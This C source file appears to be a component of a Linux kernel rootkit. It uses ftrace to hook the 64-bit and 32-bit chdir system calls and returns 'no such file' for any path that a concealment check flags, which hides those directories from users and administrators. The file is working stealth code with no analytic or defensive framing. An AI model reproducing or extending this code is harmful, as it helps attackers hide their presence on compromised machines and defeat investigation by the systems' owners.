#include "../include/ub_core.h"
#include "../include/hiding_chdir.h"
#include "../ftrace/hook_engine.h"
#include "../include/hiding_stat.h"

static asmlinkage long (*ub_real_chdir)(const struct pt_regs *);
static asmlinkage long (*ub_real_chdir32)(const struct pt_regs *);

static notrace asmlinkage long ub_hook_chdir(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->di;

    if (ub_should_conceal_path(pathname)) {
        return -ENOENT;
    }
    return ub_real_chdir(regs);
}

static notrace asmlinkage long ub_hook_chdir32(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->bx;

    if (ub_should_conceal_path(pathname)) {
        return -ENOENT;
    }
    return ub_real_chdir32(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_chdir", ub_hook_chdir, &ub_real_chdir),
    HOOK("__ia32_sys_chdir", ub_hook_chdir32, &ub_real_chdir32),
};

notrace int ub_cwdguard_start(void) {
    return ub_fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void ub_cwdguard_stop(void) {
    ub_fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
